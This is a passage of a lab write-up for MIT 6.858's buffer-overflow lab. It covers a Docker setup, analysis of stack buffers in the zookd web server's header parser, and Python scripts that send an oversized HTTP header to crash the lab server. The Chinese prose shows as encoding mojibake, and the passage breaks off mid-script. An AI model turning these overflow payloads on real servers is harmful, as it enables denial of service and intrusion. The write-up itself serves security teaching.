class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/bash\nservice ssh start\nsleep infinity&quot;</span> &gt; /root/start.sh &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chmod</span> +x /root/start.sh</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/root/start.sh&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>å› ä¸ºå®éªŒè¦å…³ ASLR æ‰€ä»¥æˆ‘ä»¬åœ¨å¯åŠ¨ docker æ—¶éœ€è¦ <code>--privileged</code>ï¼Œä¸è¿‡å› ä¸ºåªæ˜¯å®éªŒç”¨çš„å®¹å™¨æ‰€ä»¥æ— æ‰€è°“ï¼ŒåŒæ—¶ä¸ºäº†å¤–ç½‘èƒ½è®¿é—®åˆ°æ‰€ä»¥è¿™é‡Œé…äº†å‡ ä¸ªç«¯å£è½¬å‘ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker build -t <span class="hljs-string">&quot;mit_6858_img&quot;</span> .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker run -d --privileged -p <span class="hljs-string">&quot;8080:8080&quot;</span> -p <span class="hljs-string">&quot;2022:22&quot;</span> -h <span class="hljs-string">&quot;mit_6858_docker&quot;</span> --name=<span class="hljs-string">&quot;mit_6858&quot;</span> mit_6858_img</span><br></code></pre></td></tr></table></figure><p>ä¹‹åæˆ‘ä»¬ä¾¿èƒ½ç›´æ¥è¿›åˆ°å®¹å™¨å†…éƒ¨ç»§ç»­å®éªŒï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker <span class="hljs-built_in">exec</span> -it mit_6858 /bin/bash</span><br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥é€šè¿‡ ssh è¿›è¡Œè¿œç¨‹è¿æ¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ssh student@your_server_ip -p 2022</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/03/RqEPmQyLzUskg4e.png" alt="image.png"></p><h3 id="EXTRA-vscode-è¿æ¥">EXTRA.vscode è¿æ¥</h3><p>å› ä¸ºæˆ‘ä»¬çš„å®éªŒç¯å¢ƒéƒ½æœ‰ sshï¼Œæ‰€ä»¥ç›´æ¥ç”¨ vscode é€šè¿‡ ssh è¿æ¥æ˜¯éå¸¸æ–¹ä¾¿çš„ä¸€ä»¶äº‹æƒ…ï¼ˆå®¹å™¨é…ä¸Šç«¯å£è½¬å‘ä¹Ÿå¯ä»¥è¿æ¥ï¼‰</p><p>é¦–å…ˆåœ¨æ‰©å±•é‡Œæ‰¾åˆ° ssh æ’ä»¶å¹¶å®‰è£…</p><p><img src="https://s2.loli.net/2022/12/03/VlTkD8N5BPFUq7v.png" alt="image.png"></p><p>æ·»åŠ  host ä¿¡æ¯</p><p><img src="https://s2.loli.net/2022/12/03/U4ORh8JaWXulVB2.png" alt="image.png"></p><p>ä¹‹åç›´æ¥è¿æ¥ä¸Šå»å°±è¡Œäº†</p><p><img src="https://s2.loli.net/2022/12/03/vNnUWPgELZIByY4.png" alt="image.png"></p><h1>0x01. Lab1: Buffer overflows</h1><h2 id="Part-1-Finding-buffer-overflows">Part 1: Finding buffer overflows</h2><p>é¦–å…ˆç»™äº†ä¸€ä¸ªèµ„æ–™ï¼š<a href="https://thesquareplanet.com/blog/smashing-the-stack-21st-century/">Smashing the stack in the 21st century</a>ï¼ŒåŸºç¡€è–„å¼±çš„åŒå­¦å¯ä»¥ä»”ç»†çœ‹çœ‹ï¼Œç¬”è€…è¿™é‡Œç›´æ¥è·³è¿‡ï¼Œç„¶åæ˜¯ Exercise 1ï¼š</p><blockquote><p><strong>Exercise 1.</strong> Study the web serverâ€™s C code (in <code>zookd.c</code> and <code>http.c</code>), and find one example of code that allows an attacker to overwrite the return address of a function. Hint: look for buffers allocated on the stack. Write down a description of the vulnerability in the file <code>answers.txt</code>. For your vulnerability, describe the buffer which may overflow, how you would structure the input to the web server (i.e., the HTTP request) to overflow the buffer and overwrite the return address, and the call stack that will trigger the buffer overflow (i.e., the chain of function calls starting from <code>process_client</code>).</p><p>It is worth taking your time on this exercise and familiarizing yourself with the code, because your next job is to exploit the vulnerability you identified. In fact, you may want to go back and forth between this exercise and later exercises, as you work out the details and document them. That is, if you find a buffer overflow that you think can be exploited, you can use later exercises to figure out if it indeed can be exploited. It will be helpful to draw a stack diagram like the figures in <a href="https://thesquareplanet.com/blog/smashing-the-stack-21st-century/">Smashing the Stack in the 21st Century</a>.</p></blockquote><p>å¤§æ¦‚æ˜¯é˜…è¯»  <code>zookd.c</code> å’Œ <code>http.c</code> æ‰¾æ¼æ´ï¼Œæç¤ºå…³æ³¨åœ¨æ ˆä¸Šåˆ†é…çš„ bufferï¼Œå¹¶å°†ç­”æ¡ˆå†™åœ¨ <code>answers.txt</code> ä¸­~~ï¼ˆğŸ‘´ï¼šâ“ï¼‰~~</p><p>é¦–å…ˆçœ‹ <code>zookd.c</code>ï¼Œæºç æ¯”è¾ƒç®€æ´ï¼Œæ ¸å¿ƒé€»è¾‘åœ¨ <code>run_server()</code> ä¸­ï¼Œé¦–å…ˆä¼šè°ƒç”¨ <code>start_server()</code> åˆ›å»ºä¸€ä¸ª http æœåŠ¡å™¨ï¼Œä¹‹ååœ¨ <code>run_server()</code> ä¸­æœ‰ä¸€ä¸ªæ— é™å¾ªç¯è°ƒç”¨ <code>accept()</code> æ¥æ”¶è¯·æ±‚å <code>fork()</code> å‡ºå­è¿›ç¨‹è°ƒç”¨ <code>process_client()</code> å¤„ç†</p><h4 id="process-client-ï¼šå¤„ç†å•æ¬¡-HTTP-request">process_client()ï¼šå¤„ç†å•æ¬¡ HTTP request</h4><p><code>process_client()</code> çš„é€»è¾‘ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œä¸»è¦æ˜¯è°ƒç”¨ <code>http_request_line()</code> è·å–è¯·æ±‚å¤´ç¬¬ä¸€è¡Œï¼Œä¹‹åç»™åˆ° <code>env_deserialize()</code> è§£æç¯å¢ƒå˜é‡ï¼Œä¹‹åè°ƒç”¨ <code>http_request_headers()</code> è§£æå‰©ä¸‹çš„ headerï¼Œæœ€åè°ƒç”¨ <code>http_serve()</code> å¤„ç†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">process_client</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> env[<span class="hljs-number">8192</span>];  <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">static</span> <span class="hljs-type">size_t</span> env_len = <span class="hljs-number">8192</span>;<br>    <span class="hljs-type">char</span> reqpath[<span class="hljs-number">4096</span>];<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errmsg;<br><br>    <span class="hljs-comment">/* get the request line */</span><br>    <span class="hljs-keyword">if</span> ((errmsg = http_request_line(fd, reqpath, env, &amp;env_len)))<br>        <span class="hljs-keyword">return</span> http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;http_request_line: %s&quot;</span>, errmsg);<br><br>    env_deserialize(env, <span class="hljs-keyword">sizeof</span>(env));<br><br>    <span class="hljs-comment">/* get all headers */</span><br>    <span class="hljs-keyword">if</span> ((errmsg = http_request_headers(fd)))<br>      http_err(fd, <span class="hljs-number">500</span>, <span class="hljs-string">&quot;http_request_headers: %s&quot;</span>, errmsg);<br>    <span class="hljs-keyword">else</span><br>      http_serve(fd, getenv(<span class="hljs-string">&quot;REQUEST_URI&quot;</span>));<br><br>    close(fd);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="http-request-line-ï¼šè§£æ-header-ç¬¬ä¸€è¡Œ">http_request_line()ï¼šè§£æ header ç¬¬ä¸€è¡Œ</h4><p>ç°åœ¨æ¥çœ‹ <code>http_request_line()</code>ï¼Œå…¶é¦–å…ˆè°ƒç”¨äº†ä¸€ä¸ªå‡½æ•° <code>http_read_line()</code> ä» TCP è¿æ¥ä¸­è¯»å–ä¸€æ•´è¡Œï¼ˆread() ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚åœ°è¯»ï¼Œä¸€ç›´è¯»åˆ° <code>\n</code> å¹¶è¿”å›è¯»å–çš„å­—èŠ‚æ•°ï¼Œå¯¹äº <code>\r</code> è‡ªåŠ¨è·³è¿‡ï¼Œå¤±è´¥åˆ™è¿”å› <code>-1</code>ï¼Œä»£ç å°±ä¸è´´äº†ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">http_request_line</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *reqpath, <span class="hljs-type">char</span> *env, <span class="hljs-type">size_t</span> *env_len)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> buf[<span class="hljs-number">8192</span>];      <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">char</span> *sp1, *sp2, *qp, *envp = env;<br><br>    <span class="hljs-comment">/* For lab 2: don&#x27;t remove this line. */</span><br>    touch(<span class="hljs-string">&quot;http_request_line&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (http_read_line(fd, buf, <span class="hljs-keyword">sizeof</span>(buf)) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Socket IO error&quot;</span>;<br></code></pre></td></tr></table></figure><p>ä¹‹åè§£æè·¯å¾„ä¸è¯·æ±‚ç±»å‹ï¼Œä¸»è¦å°±æ˜¯ç”¨ <code>strchr()</code> è¿›è¡Œåˆ†éš”ååˆ¤æ–­ï¼Œå¹¶å°†ç»“æœå†™åˆ° <code>env</code> ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Parse request like &quot;GET /foo.html HTTP/1.0&quot; */</span><br>sp1 = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>);<br><span class="hljs-keyword">if</span> (!sp1)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cannot parse HTTP request (1)&quot;</span>;<br>*sp1 = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>sp1++;<br><span class="hljs-keyword">if</span> (*sp1 != <span class="hljs-string">&#x27;/&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Bad request path&quot;</span>;<br><br>sp2 = <span class="hljs-built_in">strchr</span>(sp1, <span class="hljs-string">&#x27; &#x27;</span>);<br><span class="hljs-keyword">if</span> (!sp2)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cannot parse HTTP request (2)&quot;</span>;<br>*sp2 = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>sp2++;<br><br><span class="hljs-comment">/* We only support GET and POST requests */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;GET&quot;</span>) &amp;&amp; <span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;POST&quot;</span>))<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Unsupported request (not GET or POST)&quot;</span>;<br><br>envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;REQUEST_METHOD=%s&quot;</span>, buf) + <span class="hljs-number">1</span>;<br>envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;SERVER_PROTOCOL=%s&quot;</span>, sp2) + <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>ç„¶åè§£æè¯·æ±‚ä¸­çš„å‚æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* parse out query string, e.g. &quot;foo.py?user=bob&quot; */</span><br><span class="hljs-keyword">if</span> ((qp = <span class="hljs-built_in">strchr</span>(sp1, <span class="hljs-string">&#x27;?&#x27;</span>)))<br>&#123;<br>    *qp = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;QUERY_STRING=%s&quot;</span>, qp + <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹‹åè°ƒç”¨ <code>url_decode(dst, src)</code> è§£æ request URLï¼Œè¿™ä¸ªå‡½æ•°ä¸»è¦å°±æ˜¯æŠŠ URL é‡Œçš„ <code>%ab</code> æ¢æˆ <code>0xab</code> ï¼ŒæŠŠ <code>+</code> æ¢æˆ ç©ºæ ¼ï¼Œç”± <code>src</code> æ‹·è´åˆ° <code>dst</code> ï¼›æœ€åå°†ç»“æœå†™å› <code>env</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-comment">/* decode URL escape sequences in the requested path into reqpath */</span><br>    url_decode(reqpath, sp1);<br><br>    envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;REQUEST_URI=%s&quot;</span>, reqpath) + <span class="hljs-number">1</span>;<br><br>    envp += <span class="hljs-built_in">sprintf</span>(envp, <span class="hljs-string">&quot;SERVER_NAME=zoobar.org&quot;</span>) + <span class="hljs-number">1</span>;<br><br>    *envp = <span class="hljs-number">0</span>;<br>    *env_len = envp - env + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="http-request-headers-ï¼šè§£æ-header-å‰©ä½™éƒ¨åˆ†ï¼ˆå­˜åœ¨æ¼æ´ï¼‰">http_request_headers()ï¼šè§£æ header å‰©ä½™éƒ¨åˆ†ï¼ˆå­˜åœ¨æ¼æ´ï¼‰</h4><p>è¿›æ¥é¦–å…ˆæ˜¯ä¸€ä¸ªå¤§å¾ªç¯ï¼Œæ¯æ¬¡å¾ªç¯éƒ½ä¼šè°ƒç”¨ <code>http_read_line()</code> è¯»å–ä¸€è¡Œ header è¿›è¡Œè§£æï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">http_request_headers</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">char</span> buf[<span class="hljs-number">8192</span>];      <span class="hljs-comment">/* static variables are not on the stack */</span><br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">char</span> value[<span class="hljs-number">512</span>];<br>    <span class="hljs-type">char</span> envvar[<span class="hljs-number">512</span>];<br><br>    <span class="hljs-comment">/* For lab 2: don&#x27;t remove this line. */</span><br>    touch(<span class="hljs-string">&quot;http_request_headers&quot;</span>);<br><br>    <span class="hljs-comment">/* Now parse HTTP headers */</span><br>    <span class="hljs-keyword">for</span> (;;)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (http_read_line(fd, buf, <span class="hljs-keyword">sizeof</span>(buf)) &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Socket IO error&quot;</span>;<br><br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\0&#x27;</span>)     <span class="hljs-comment">/* end of headers */</span><br>            <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>ä¹‹åæ˜¯è§£æ <code>key: value</code> å‹çš„å€¼ï¼Œé¦–å…ˆæ˜¯ <code>shrchr()</code> æŒ‰ç©ºæ ¼è¿›è¡Œåˆ†å‰²ï¼Œç„¶åå°† <code>key</code> è½¬æˆå¤§å†™ä¸” <code>-</code> è½¬æˆ <code>_</code> ï¼Œä¹‹åè°ƒç”¨ <code>url_decode()</code> è§£æ</p><ul><li>è¿™é‡Œæˆ‘ä»¬æ³¨æ„åˆ° <code>value</code> æ˜¯ä¸€ä¸ª<strong>ä½äºå‡½æ•°æ ˆä¸Šçš„å­—ç¬¦æ•°ç»„ï¼Œé•¿åº¦ä»…ä¸º 512</strong>ï¼Œè€Œè¯¥ HTTP server æ‰€å…è®¸çš„å•è¡Œæœ€å¤§é•¿åº¦ä¸º 8192 å­—ç¬¦ï¼Œè¿™æ„å‘³ç€<strong>æˆ‘ä»¬å¯ä»¥å¾ˆè½»æ˜“åœ°é€šè¿‡ä¼ å…¥ä¸€ä¸ªè¾ƒé•¿çš„é”®å€¼å¯¹å‚æ•°æ¥å®Œæˆæ ˆæº¢å‡º</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Parse things like &quot;Cookie: foo bar&quot; */</span><br><span class="hljs-type">char</span> *sp = <span class="hljs-built_in">strchr</span>(buf, <span class="hljs-string">&#x27; &#x27;</span>);<br><span class="hljs-keyword">if</span> (!sp)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Header parse error (1)&quot;</span>;<br>*sp = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>sp++;<br><br><span class="hljs-comment">/* Strip off the colon, making sure it&#x27;s there */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(buf) == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Header parse error (2)&quot;</span>;<br><br><span class="hljs-type">char</span> *colon = &amp;buf[<span class="hljs-built_in">strlen</span>(buf) - <span class="hljs-number">1</span>];<br><span class="hljs-keyword">if</span> (*colon != <span class="hljs-string">&#x27;:&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Header parse error (3)&quot;</span>;<br>*colon = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br><span class="hljs-comment">/* Set the header name to uppercase and replace hyphens with underscores */</span><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(buf); i++) &#123;<br>    buf[i] = <span class="hljs-built_in">toupper</span>(buf[i]);<br>    <span class="hljs-keyword">if</span> (buf[i] == <span class="hljs-string">&#x27;-&#x27;</span>)<br>        buf[i] = <span class="hljs-string">&#x27;_&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">/* Decode URL escape sequences in the value */</span><br>url_decode(value, sp);<br></code></pre></td></tr></table></figure><p>æœ€åéƒ¨åˆ†å°±æ˜¯å¦‚æœ <code>key</code> ä¸ä¸º <code>CONTENT_TYPE</code> æˆ– <code>CONTENT_LENGTH</code> åˆ™åœ¨å‰é¢åŠ ä¸Šå­—ç¬¦ä¸² <code>HTTP_</code> åå­˜å‚¨åˆ° <code>envvar</code> ä¸­ï¼Œå¹¶è°ƒç”¨ <code>setenv()</code> è®¾ç½®  <em>ç¯å¢ƒå˜é‡</em>  ä¸­çš„å¯¹åº”å€¼</p><ul><li>è¿™é‡Œæˆ‘ä»¬æ³¨æ„åˆ° <code>envvar</code> ä¹Ÿæ˜¯ä¸€ä¸ª<strong>ä½äºå‡½æ•°æ ˆä¸Šçš„é•¿åº¦ä»…ä¸º 512çš„å­—ç¬¦æ•°ç»„</strong>ï¼Œå› æ­¤åœ¨è¿™é‡Œä¹Ÿå¯ä»¥å‘ç”Ÿ<strong>æ ˆæº¢å‡º</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">        <span class="hljs-comment">/* Store header in env. variable for application code */</span><br>        <span class="hljs-comment">/* Some special headers don&#x27;t use the HTTP_ prefix. */</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;CONTENT_TYPE&quot;</span>) != <span class="hljs-number">0</span> &amp;&amp;<br>            <span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;CONTENT_LENGTH&quot;</span>) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">sprintf</span>(envvar, <span class="hljs-string">&quot;HTTP_%s&quot;</span>, buf);<br>            setenv(envvar, value, <span class="hljs-number">1</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            setenv(buf, value, <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆä¸‹é¢æˆ‘ä»¬æ¥åˆ° Exercise2ï¼Œå†™ä¸€ä¸ª exp æ¥è®© zookd ç¨‹åº crash æ‰ï¼š</p><blockquote><p><strong>Exercise 2.</strong> Write an exploit that uses a buffer overflow to crash the web server (or one of the processes it creates). You do not need to inject code at this point. Verify that your exploit crashes the server by checking the last few lines of <code>dmesg | tail</code>, using <code>gdb</code>, or observing that the web server crashes (i.e., it will print <code>Child process 9999 terminated incorrectly, receiving signal 11</code>)</p><p>Provide the code for the exploit in a file called <code>exploit-2.py</code>.</p><p>The vulnerability you found in Exercise 1 may be too hard to exploit. Feel free to find and exploit a different vulnerability.</p></blockquote><p>æˆ‘ä»¬ç°åœ¨æ¥æµ‹è¯•ä¸€ä¸‹è¿™ä¸ªæ¼æ´ï¼Œé¦–å…ˆç¼–å†™ä¸€ä¸ªæ­£å¸¸çš„ HTTP Get è¯·æ±‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">host, port</span>):<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((host, <span class="hljs-built_in">int</span>(port)))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    payload = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + <span class="hljs-string">b&quot;rat3bant&quot;</span> + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(payload)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += rbuf<br>        rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got response:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(resp)<br><br>    sock.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: &#123;&#125; host port&quot;</span>.<span class="hljs-built_in">format</span>(sys.argv[<span class="hljs-number">0</span>]))<br>        exit(-<span class="hljs-number">1</span>)<br>    exp(sys.argv[<span class="hljs-number">1</span>], sys.argv[<span class="hljs-number">2</span>])<br></code></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/11/29/PujgG7EJVMmOiz1.png" alt="image.png"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°è¯•åˆ©ç”¨ <code>envvar</code> è¿›è¡Œæº¢å‡ºæµ‹è¯•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.connect((<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">8080</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Connected to the server. Sending request now...&quot;</span>)<br><br>    payload = <span class="hljs-string">b&quot;GET / HTTP/1.0\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;arttnba3: &quot;</span> + <span class="hljs-string">b&quot;rat3bant&quot;</span> * <span class="hljs-number">512</span> + <span class="hljs-string">b&quot;\r\n&quot;</span><br>    payload += <span class="hljs-string">b&quot;\r\n&quot;</span><br>    sock.send(payload)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Receiving response...&quot;</span>)<br>    rbuf = sock.recv(<span class="hljs-number">1024</span>)<br>    resp = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(rbuf):<br>        resp += 